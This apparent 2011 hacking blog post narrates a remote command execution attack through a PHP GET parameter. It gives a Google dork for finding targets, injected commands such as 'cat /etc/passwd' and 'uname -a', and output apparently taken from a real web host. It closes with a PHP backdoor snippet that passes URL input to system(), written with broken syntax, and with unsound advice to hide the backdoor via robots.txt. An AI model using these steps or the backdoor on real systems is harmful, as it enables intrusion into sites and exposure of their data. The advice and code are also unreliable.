---
id: 1702
title: A history of hack!
date: 2011-11-14T08:30:56+01:00
author: ax
excerpt: |
  <p>History informativa di un  attacco RCE <em>"tipico"</em> via PHP GET variable.<strong><br />
  </strong></p>
layout: post
guid: http://linuax.altervista.org/blog/?p=1702
permalink: /2011/11/14/a-history-of-hack/
categories:
  - Hacking
  - History
tags:
  - history
  - php get
  - rce
---
<span style="font-size: large;"><strong>Remote Code Execution via PHP GET variable.</strong></span>

- Searching for vulnerable link dorking with google:

<pre>inurl:"*.php?lol="</pre>

- Found something...

<pre>http://www.sito.com/page.php?var=</pre>

- Try some stuffs...

<pre>http://www.sito.com/page.php?var='</pre>

- Nothing happens

<pre>http://www.sito.com/page.php?var=ls</pre>

- Something happens :)

Get the current directory list.

<pre>http://www.sito.com/page.php?var=ls</pre>

<pre>CHANGELOG.php
 COPYRIGHT.php
 CREDITS.php
 LICENSE.php
 LICENSES.php
 administrator
 cache
 components
 configuration.php
 configuration.php-dist
 htaccess.txt
 images
 includes
 index.html.bak
 index.php
 index2.php
 language
 libraries
 logs
 media
 metaconfig.xml
 migration
 mod_acajoom.php
 mod_acajoom.xml
 modules
 plugins
 robots.txt
 templates
 tmp
 xmlrpc</pre>

-Get the list of the administrator directory.

<pre>http://www.sito.com/page.php?var=ls administrator</pre>

<pre>backups
 cache
 components
 help
 images
 includes
 index.php
 index2.php
 index3.php
 language
 modules
 templates</pre>

- Catting the /etc/passwd file.

<pre>http://www.sito.com/page.php?var=cat /etc/passwd</pre>

<pre># $FreeBSD: src/etc/master.passwd,v 1.40.22.2 2011/03/28 17:41:10 trociny Exp $
 #
 root:*:0:0:Charlie &:/root:/bin/csh
 toor:*:0:0:Bourne-again Superuser:/root:
 daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
 operator:*:2:5:System &:/:/usr/sbin/nologin
 bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
 tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
 kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
 games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
 news:*:8:8:News Subsystem:/:/usr/sbin/nologin
 man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
 sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
 smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
 mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
 bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
 proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
 _pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
 _dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
 uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
 pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
 www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
 hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
 nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
 admin:*:500:500:Systems Administrator:/home/admin:/bin/sh
 alias:*:81:81:QMail user:/var/qmail/alias:/nonexistent
 qmaild:*:82:81:QMail user:/var/qmail:/nonexistent
 qmaill:*:83:81:QMail user:/var/qmail:/nonexistent
 qmailp:*:84:81:QMail user:/var/qmail:/nonexistent
 qmailq:*:85:82:QMail user:/var/qmail:/nonexistent
 qmailr:*:86:82:QMail user:/var/qmail:/nonexistent
 qmails:*:87:82:QMail user:/var/qmail:/nonexistent</pre>

- Get the system version.

<pre>http://www.sito.com/page.php?var=uname -a</pre>

<pre>FreeBSD unix3.alpha.hostsg.com 8.2-STABLE FreeBSD 8.2-STABLE #1: Wed Oct  5 01:26:08 SGT 2011     admin@master1.alpha.hostsg.com:/usr/obj/usr/src/sys/X9SCD  amd64</pre>

- Get the current path.

<pre>http://www.sito.com/page.php?var=pwd</pre>

<pre>/home/web/singaporeultimat/public_html</pre>

- And the userid with the group id.

<pre>http://www.sito.com/page.php?var=id</pre>

<pre>uid=80(www) gid=80(www) groups=80(www)</pre>

- Conclusions: if you really need a variable that allow you to execute command on the local machine make sure you create a **robots.txt** file that contains the path for preventing google dork discover this.

How to make a PHP GET variable that allow you to execute arbitrary command on the local machine.  
Just type in the .php files this strings:

<div class="codecolorer-container php dawn" style="overflow:auto;white-space:nowrap;width:%;">
  <div class="php codecolorer">
    <span class="kw1">if</span> <span class="br0">&#40;</span><span class="kw3">isset</span><span class="br0">&#40;</span><span class="re0">$_GET</span><span class="br0">&#91;</span><span class="st_h">'name'</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="br0">&#123;</span><br /> <span class="re0">$output</span><span class="sy0">=</span><span class="kw3">system</span> <span class="br0">&#40;</span><span class="re0">$_GET</span><span class="br0">&#91;</span><span class="st_h">'name'</span><span class="br0">&#41;</span><span class="br0">&#125;</span><span class="sy0">;</span> <span class="co1">//maybe in specify machine cloud be exec()</span><br /> <span class="re0">$echo</span> <span class="re0">$output</span><span class="sy0">;</span><br /> <span class="br0">&#125;</span>
  </div>
</div>

-Than in the browser:

<pre>http://victim.com/page=1?name=ls</pre>

\# End - Razor4x